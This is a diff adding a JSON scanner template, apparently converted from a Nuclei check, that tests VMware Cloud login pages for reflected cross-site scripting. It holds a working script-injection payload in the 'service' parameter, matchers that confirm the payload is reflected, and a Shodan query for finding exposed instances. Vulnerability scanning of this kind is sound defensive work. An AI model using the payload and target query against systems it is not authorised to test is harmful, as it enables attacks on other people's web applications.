@@ -1,0 +1,158 @@
+{
+  "id": "vmware-cloud-xss",
+  "name": "VMWare Cloud - Cross Site Scripting",
+  "author": "tess",
+  "severity": "MEDIUM",
+  "description": "VMWare Cloud is vulnerable to Reflected Cross Site Scripting vulnerability.",
+  "tags": [
+    "vmware",
+    "xss",
+    "cloud"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "title:\"Vmware Cloud\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/login/?redirectTo\u003d/tenant/e\u0026service\u003d\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e",
+            "let tokens \u003d \""
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "text/html"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "vmware-cloud-xss",
+    "info": {
+      "name": "VMWare Cloud - Cross Site Scripting",
+      "author": "tess",
+      "severity": "medium",
+      "description": "VMWare Cloud is vulnerable to Reflected Cross Site Scripting vulnerability.",
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "title:\"Vmware Cloud\""
+      },
+      "tags": "vmware,xss,cloud"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/login/?redirectTo\u003d/tenant/e\u0026service\u003d\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e",
+              "let tokens \u003d \""
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "text/html"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
